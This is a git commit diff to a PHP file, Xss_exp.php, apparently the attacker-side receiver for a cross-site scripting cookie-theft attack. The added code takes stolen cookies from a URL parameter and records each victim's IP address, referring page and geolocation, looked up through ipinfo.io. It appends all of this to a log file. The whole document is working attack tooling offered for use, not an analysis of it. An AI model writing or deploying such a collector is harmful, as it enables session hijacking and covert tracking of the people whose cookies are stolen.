77ae24476bf4bce2afe9a37ec8218f302516fb0e
BaraaHakam <145768104+BaraaHakam@users.noreply.github.com>
2023-09-28 03:57:34 +0300

    XssPayload.php

--- Xss_exp.php
+++ Xss_exp.php
@@ -4,6 +4,25 @@ function getClientIP() {
     return $ip;
 }
 
-$cookie = $_GET['cookie'] ?? 'Cookie Unknown';
-$ip = getClientIP();
+function all() {
+    $cookie = $_GET['cookie'] ?? 'Cookie Unknown'."\n";
+    $ip = getClientIP();
+    $VicIp = "user ip is >>> " . $ip . "\n";
+    $ref = "user comes from >>> " . ($_SERVER['HTTP_REFERER'] ?? 'Referer Unknown') . "\n";
+    $json = file_get_contents("https://ipinfo.io/$ip/geo");
+    $data = json_decode($json, true);
+    $country = "user country is >> " . $data['country'] . "\n";
+    $region = "user region is >> " . $data['region'] . "\n";
+    $city = "user city is >> " . $data['city'] . "\n";
+
+    // Combine all the information into one string
+    $info = $cookie . $VicIp . $ref . $country . $region . $city;
+
+    return $info;
+}
+
+$info = all();
+$file = fopen('log.txt', 'a');
+fwrite($file, $info);
+fclose($file);
 ?>
